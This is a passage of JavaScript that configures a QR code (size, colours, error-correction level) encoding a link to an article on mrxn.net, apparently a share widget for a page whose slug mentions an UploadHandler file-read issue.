text: encodeURI("https://mrxn.net/jswz/mamabaohe-UploadHandler-url-fileread.html"),
width: 100,
height: 100,
colorDark: "#000000",
colorLight: "#ffffff",
correctLevel: QRCode.CorrectLevel.H
});
 